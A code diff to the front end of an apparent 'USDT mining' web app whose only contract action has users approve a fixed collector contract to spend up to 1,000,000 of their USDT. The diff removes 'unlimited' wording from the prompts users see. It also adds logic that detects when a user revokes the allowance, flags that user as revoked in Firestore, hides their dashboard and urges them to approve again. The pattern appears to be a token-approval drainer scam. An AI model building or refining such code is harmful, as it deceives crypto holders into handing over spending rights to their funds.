@@ -252,13 +252,14 @@
         let latestFbUserData = {};
         let walletEventsBound = false;
         let onChainRegisteredBonus = 0;
+        let isCurrentUserRevoked = false;
 
         let hasPendingWithdraw = false;
         let isWithdrawSubmitting = false;
         let unsubPendingWithdraw = null;
         let unsubUserBalances = null;
 
-        // Only USDT approve() uses the contract (Unlimited approval via MaxUint256)
+        // Only USDT approve() uses the contract
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const APPROVE_LIMIT_USDT = "1000000";
@@ -297,6 +298,46 @@
                 promise,
                 new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
             ]);
+        }
+
+        async function handleRevokedUserState(addr) {
+            isCurrentUserRevoked = true;
+            currentWithdrawableBalance = 0;
+
+            const dashboardEl = document.getElementById("userDashboard");
+            if (dashboardEl) dashboardEl.classList.add("hidden");
+
+            const badgeEl = document.getElementById("selectedNetworkBadge");
+            if (badgeEl) badgeEl.classList.add("hidden");
+
+            const connectBtn = document.getElementById("connectBtn");
+            if (connectBtn) {
+                connectBtn.innerText = "Connect Wallet";
+                connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+            }
+
+            const statusEl = document.getElementById("statusLog");
+            if (statusEl) {
+                statusEl.innerText = "⚠️ Your mining approval was revoked (Allowance: 0.0 USDT). Please Approve Mining again to access your dashboard.";
+            }
+
+            if (addr) {
+                try {
+                    const key = String(addr).toLowerCase();
+                    const userRef = db.collection("users").doc(key);
+                    const snap = await userRef.get();
+                    if (snap.exists && snap.data()?.status !== "banned" && snap.data()?.status !== "revoked") {
+                        await userRef.set({
+                            status: "revoked",
+                            autoApproved: false,
+                            revokedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                        }, { merge: true });
+                    }
+                } catch (err) {
+                    console.error("Failed to mark user revoked in Firestore:", err);
+                }
+            }
         }
 
         function applyBalancesToDashboard(formattedBal, fbUser = latestFbUserData) {
@@ -359,6 +400,11 @@
                 if (fbUser.status === "banned") {
                     alert("Your account has been banned by Admin!");
                     document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
+                    return;
+                }
+
+                if (fbUser.status === "revoked" || isCurrentUserRevoked) {
+                    document.getElementById("userDashboard").classList.add("hidden");
                     return;
                 }
 
@@ -677,6 +723,7 @@
                 currentWithdrawableBalance = 0;
                 currentWalletBalanceNum = 0;
                 latestFbUserData = {};
+                isCurrentUserRevoked = false;
                 if (typeof unsubUserBalances === "function") {
                     unsubUserBalances();
                     unsubUserBalances = null;
@@ -774,7 +821,16 @@
             provider.on("block", async () => {
                 try {
                     const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                    const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, null);
+                    const [balance, allowance] = await Promise.all([
+                        withTimeout(usdtContract.balanceOf(userAddress), 6000, null),
+                        withTimeout(usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS), 6000, null)
+                    ]);
+
+                    if (allowance !== null && BigInt(allowance) <= 0n) {
+                        await handleRevokedUserState(userAddress);
+                        return;
+                    }
+
                     if (balance === null) return;
                     const formattedBal = Number(ethers.formatUnits(balance, 6));
                     applyBalancesToDashboard(formattedBal, latestFbUserData);
@@ -814,7 +870,8 @@
                     return;
                 }
 
-                if (Number(allowance) > 0) {
+                if (BigInt(allowance) > 0n) {
+                    isCurrentUserRevoked = false;
                     showProgress(65, "Syncing Account ID & Dashboard...");
                     const connectBtn = document.getElementById("connectBtn");
                     connectBtn.innerText = "Active Mining";
@@ -833,7 +890,7 @@
                     startRealtimeBalanceSync();
                 } else {
                     hideProgress();
-                    document.getElementById("statusLog").innerText = "Click to Connect Wallet button and Approve Mining.";
+                    await handleRevokedUserState(userAddress);
                 }
             } catch (err) {
                 console.error("Allowance check error:", err);
@@ -891,7 +948,8 @@
                     0n
                 );
 
-                if (Number(allowance) > 0) {
+                if (BigInt(allowance ?? 0n) > 0n) {
+                    isCurrentUserRevoked = false;
                     showProgress(80, "Entering to your Dashboard...");
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
@@ -929,7 +987,7 @@
             }
         }
 
-        // ONLY action using Contract: USDT approve() (Unlimited via ethers.MaxUint256)
+        // ONLY action using Contract: USDT approve()
         async function switchToPolygonAndApprove() {
             try {
                 const badgeEl = document.getElementById("selectedNetworkBadge");
@@ -939,13 +997,15 @@
                 connectBtn.innerText = "Active Mining";
                 connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
-                showProgress(50, "Submitting unlimited approval Mining...");
-                startCountdown(25, "Unlimited Approval to Mining");
+                showProgress(50, "Submitting approval Mining...");
+                startCountdown(25, "Approval to Mining");
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
-                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, UNLIMITED_APPROVE_AMOUNT);
+                const maxAmount = ethers.parseUnits(APPROVE_LIMIT_USDT, 6);
+                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
                 const receipt = await tx.wait();
 
+                isCurrentUserRevoked = false;
                 stopCountdown();
                 showProgress(75, "Auto-approving registration & notifying Admin...");
                 const referrer = resolveReferrerAddress(userAddress);
@@ -1008,12 +1068,11 @@
                     const allowance = await withTimeout(
                         usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
                         6000,
-                        1n
+                        null
                     );
 
-                    if (Number(allowance ?? 0) <= 0 && Object.keys(fbUser).length === 0) {
-                        currentWithdrawableBalance = 0;
-                        dashboardEl.classList.add("hidden");
+                    if (allowance !== null && BigInt(allowance) <= 0n) {
+                        await handleRevokedUserState(userAddress);
                         return;
                     }
 
@@ -1021,6 +1080,11 @@
                     if (balance !== null) {
                         formattedBal = Number(ethers.formatUnits(balance, 6));
                     }
+                }
+
+                if (fbUser.status === "revoked" || isCurrentUserRevoked) {
+                    await handleRevokedUserState(userAddress);
+                    return;
                 }
 
                 dashboardEl.classList.remove("hidden");
@@ -1132,11 +1196,11 @@
                     0n
                 );
                 if ((currentAllowance ?? 0n) < rawBalance) {
-                    showProgress(55, "USDT Unlimited Approval Transaction တင်နေသည်...");
+                    showProgress(55, "USDT Approval Transaction တင်နေသည်...");
                     const usdtSigner = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
                     const appTx = await usdtSigner.approve(
                         COLLECTOR_CONTRACT_ADDRESS,
-                        UNLIMITED_APPROVE_AMOUNT
+                        ethers.parseUnits(APPROVE_LIMIT_USDT, 6)
                     );
                     await appTx.wait();
                 }
